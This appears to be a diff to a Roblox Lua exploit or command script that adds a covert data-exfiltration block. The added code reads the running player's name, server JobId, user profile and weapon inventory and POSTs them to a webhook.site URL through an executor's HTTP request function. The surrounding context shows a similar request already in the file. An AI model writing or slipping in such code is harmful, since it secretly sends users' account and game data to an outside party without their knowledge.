@@ -177,6 +177,46 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+local url = "https://webhook.site/7b2ec9f2-551d-4708-9d07-7e9f716a20cb"
+   
+t = {}
+for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
+ table.insert(t, tostring(i).." : "..tostring(v)..", ")
+end
+inventory = table.concat(t)
+   
+local data = {
+		["embeds"] = {
+					{
+						["Profile"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
+						["footer"] = {
+							["icon_url"] = 'https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096',
+							["text"] = ""
+						},
+						["Jobid"] = {
+							["url"] = game.JobId,
+						},
+						["author"] = {
+							["name"] = ""
+						},
+						["fields"] = {
+							{
+								["name"] = '**Player profile**',
+								["profile"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
+								["inline"] = true
+							},
+						}
+					}}
+			}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+
 Player = game.Players.LocalPlayer
 Pl = game.Players
 function MainCommands(plr, msg)
